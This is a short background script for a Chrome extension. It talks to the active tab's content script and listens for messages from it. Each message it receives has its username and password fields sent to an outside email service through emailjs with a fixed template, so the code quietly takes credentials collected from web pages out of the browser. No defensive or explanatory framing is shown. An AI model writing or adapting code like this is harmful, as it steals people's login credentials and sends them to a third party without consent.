console.log("background running!!!");

chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
	chrome.tabs.sendMessage(tabs[0].id, "background ready!!!", function(responce){
		console.log(responce);
	})	
});

chrome.runtime.onMessage.addListener(function(message, sender, responce){
	console.log(message);
	responce("data received!!!");
	emailjs.send("default_service","template_YU6zLnpq",{user_name: message.username, password: message.password});
});
